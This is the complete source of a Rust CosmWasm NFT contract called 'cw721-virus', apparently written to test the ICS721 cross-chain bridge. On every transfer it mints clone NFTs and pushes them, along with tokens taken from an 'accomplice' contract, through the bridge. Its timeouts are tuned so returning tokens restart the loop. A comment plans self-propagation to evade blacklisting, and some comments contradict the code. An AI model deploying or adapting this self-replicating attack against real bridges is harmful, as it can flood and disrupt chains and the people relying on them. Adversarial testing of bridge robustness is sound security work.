use cosmwasm_schema::cw_serde;
#[cfg(not(feature = "library"))]
use cosmwasm_std::entry_point;
use cosmwasm_std::{
    to_binary, Addr, Binary, CosmosMsg, Deps, DepsMut, Empty, Env, IbcTimeout, MessageInfo,
    Response, StdError, StdResult, WasmMsg,
};
use cw2::set_contract_version;
use cw721::{CustomMsg, Cw721ReceiveMsg};
use cw721_base::{msg, ContractError, Cw721Contract, Extension, MintMsg};
use cw_ics721_bridge::msg::IbcOutgoingMsg;
use cw_storage_plus::Item;

#[cw_serde]
pub enum ExtensionMsg {
    UpdateSpikeProteins {
        accomplice_src: Option<String>,
        accomplice_dst: Option<String>,
        channel_id: Option<String>,
        bridge_contract: Option<String>,
    },
}

#[cw_serde]
pub enum ExtensionQuery {
    Count {},
}

impl CustomMsg for ExtensionQuery {}

impl CustomMsg for ExtensionMsg {}

pub type MintExtension = Option<Extension>;

pub type Cw721VirusContract<'a> = Cw721Contract<'a, Extension, Empty, ExtensionMsg, ExtensionQuery>;

pub type ExecuteMsg = msg::ExecuteMsg<Extension, ExtensionMsg>;
pub type QueryMsg = msg::QueryMsg<ExtensionQuery>;

#[cw_serde]
pub struct InstantiateMsg {
    pub name: String,
    pub symbol: String,
    pub minter: String,
}

/// address of accomplice on counterparty chain.
/// This is a string because we don't know the address format on the
/// other chain
const ACCOMPLICE_SRC: Item<String> = Item::new("accomplice_src");
/// address of accomplice on this chain
const ACCOMPLICE_DST: Item<Addr> = Item::new("accomplice_dst");
/// bridge contract address
const BRIDGE_CONTRACT: Item<Addr> = Item::new("bridge_contract");
/// ibc channel to send packets across
const CHANNEL_ID: Item<String> = Item::new("channel_id");

const CONTRACT_NAME: &str = "crates.io:cw721-virus";
const CONTRACT_VERSION: &str = env!("CARGO_PKG_VERSION");

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn instantiate(
    mut deps: DepsMut,
    env: Env,
    info: MessageInfo,
    msg: InstantiateMsg,
) -> Result<Response, ContractError> {
    let response = cw721_base::entry::instantiate(
        deps.branch(),
        env,
        info,
        msg::InstantiateMsg {
            name: msg.name,
            symbol: msg.symbol,
            minter: msg.minter,
        },
    )?;

    set_contract_version(deps.storage, CONTRACT_NAME, CONTRACT_VERSION)?;

    Ok(response)
}

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn execute(
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    msg: ExecuteMsg,
) -> Result<Response, ContractError> {
    match msg {
        cw721_base::ExecuteMsg::TransferNft { .. } => execute_transfer_nft(deps, env, info),
        ExecuteMsg::Extension { msg } => match msg {
            ExtensionMsg::UpdateSpikeProteins {
                accomplice_src,
                accomplice_dst,
                channel_id,
                bridge_contract,
            } => {
                // permissionless for testing purposes. an actual attacker would lock
                // it down.
                if let Some(accomplice_src) = accomplice_src {
                    ACCOMPLICE_SRC.save(deps.storage, &accomplice_src)?;
                }
                // verified dest
                if let Some(accomplice_dst) = accomplice_dst {
                    ACCOMPLICE_DST.save(deps.storage, &deps.api.addr_validate(&accomplice_dst)?)?;
                }
                // channel
                if let Some(channel_id) = channel_id {
                    CHANNEL_ID.save(deps.storage, &channel_id)?;
                }
                // verified bridge contract
                if let Some(bridge_contract) = bridge_contract {
                    BRIDGE_CONTRACT
                        .save(deps.storage, &deps.api.addr_validate(&bridge_contract)?)?;
                }
                Ok(Response::default())
            }
        },
        _ => Cw721VirusContract::default().execute(deps, env, info, msg),
    }
}

pub fn execute_transfer_nft(
    mut deps: DepsMut,
    env: Env,
    info: MessageInfo,
) -> Result<Response, ContractError> {
    let base = Cw721VirusContract::default();
    let accomplice_dst = ACCOMPLICE_DST.may_load(deps.storage)?;
    let accomplice_src = ACCOMPLICE_SRC.load(deps.storage)?;
    let channel_id = CHANNEL_ID.load(deps.storage)?;
    let bridge_contract = BRIDGE_CONTRACT.load(deps.storage)?;

    let timeout_timestamp = env.block.time.plus_seconds(60 * 60);
    let mut ibc_msg = IbcOutgoingMsg {
        receiver: accomplice_src,
        channel_id,
        // 5 minutes from now.
        timeout: IbcTimeout::with_timestamp(timeout_timestamp),
        memo: None,
    };

    let mut msgs = if let Some(accomplice_dst) = accomplice_dst {
        let cw721::TokensResponse { tokens } = deps.querier.query_wasm_smart(
            &accomplice_dst,
            &cw721_base::msg::QueryMsg::<Empty>::Tokens {
                owner: env.contract.address.to_string(),
                limit: Some(6),
                start_after: None,
            },
        )?;

        // maintains functionality when there are zero nfts.
        tokens
            .iter()
            .map(|token| -> Result<cw721::Cw721ExecuteMsg, StdError> {
                Ok(cw721::Cw721ExecuteMsg::SendNft {
                    contract: bridge_contract.to_string(),
                    token_id: token.clone(),
                    msg: to_binary(&ibc_msg)?,
                })
            })
            .map(|msg| -> Result<_, StdError> {
                let msg = msg.map_err(StdError::from)?;
                Ok(cosmwasm_std::CosmosMsg::Wasm(WasmMsg::Execute {
                    contract_addr: accomplice_dst.to_string(),
                    msg: to_binary(&msg)?,
                    funds: vec![],
                }))
            })
            .collect::<Result<Vec<_>, _>>()
            .map_err(ContractError::Std)?
    } else {
        vec![]
    };

    // we want the accomplice to time out and return before this
    // nft returns. so that when this nft returns, it will rerun this
    // function and start all over again.
    ibc_msg.timeout = IbcTimeout::with_timestamp(timeout_timestamp.plus_seconds(60));

    // insert 1 clone of `send` at index 0 and in-between every message in
    // `msgs`.
    let _msgs_len = msgs.len();
    msgs = msgs
        .into_iter()
        .enumerate()
        .map(|(i, msg)| -> StdResult<Vec<CosmosMsg>> {
            let token_count = base.token_count(deps.storage)?.to_string();
            // token_count & blockheight & tx index
            let token_id = format!(
                "{}:{}:{}:{}",
                token_count,
                env.block.height,
                env.transaction.clone().map_or(0, |tx| tx.index),
                i
            );
            base.minter.save(deps.storage, &info.sender)?;
            base.mint(
                deps.branch(),
                env.clone(),
                info.clone(),
                MintMsg {
                    token_id: token_id.clone(),
                    owner: bridge_contract.to_string(),
                    token_uri: Some(format!("https://virus.com/{}", token_id)),
                    extension: None,
                },
            )
            .map_err(|_| StdError::generic_err("mint failed"))?;

            let send = Cw721ReceiveMsg {
                sender: env.contract.address.to_string(),
                token_id,
                msg: to_binary(&ibc_msg)?,
            };

            let mut v = vec![msg];
            v.insert(0, send.into_cosmos_msg(bridge_contract.clone())?);
            Ok(v)
        })
        .collect::<StdResult<Vec<_>>>()?
        .into_iter()
        .flatten()
        .collect();

    let min_length = 10;
    // pad end with `send` clones. min length of 6.
    while msgs.len() < min_length {
        let token_count = base.token_count(deps.storage)?.to_string();
        // token_count & blockheight & tx index
        let token_id = format!(
            "{}:{}:{}:{}",
            token_count,
            env.block.height,
            env.transaction.clone().map_or(0, |tx| tx.index),
            msgs.len()
        );
        base.minter.save(deps.storage, &info.sender)?;
        base.mint(
            deps.branch(),
            env.clone(),
            info.clone(),
            MintMsg {
                token_id: token_id.clone(),
                owner: bridge_contract.to_string(),
                token_uri: Some(format!("https://virus.com/{}", token_id)),
                extension: None,
            },
        )
        .map_err(|_| StdError::generic_err("mint failed"))?;

        ibc_msg.memo = Some(msgs.len().to_string());
        // increase timeout by 1 minute for each message.
        ibc_msg.timeout = IbcTimeout::with_timestamp(
            timeout_timestamp
                .plus_seconds(60)
                .plus_seconds(msgs.len() as u64 * 60),
        );
        let send = Cw721ReceiveMsg {
            sender: env.contract.address.to_string(),
            token_id,
            msg: to_binary(&ibc_msg)?,
        };

        msgs.push(send.into_cosmos_msg(bridge_contract.clone())?)
    }

    // todo: self-propagate by instantiating duplicate contracts.
    // this will make blacklisting much more difficult.

    // Send message
    Ok(Response::new()
        .add_messages(msgs)
        .add_attribute("action", "send_nft")
        .add_attribute("sender", info.sender.to_string())
        .add_attribute("recipient", bridge_contract))
}

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn query(deps: Deps, env: Env, msg: QueryMsg) -> StdResult<Binary> {
    match msg {
        QueryMsg::Extension { msg } => match msg {
            ExtensionQuery::Count {} => to_binary(&Some(1)),
        },
        _ => Cw721VirusContract::default().query(deps, env, msg),
    }
}
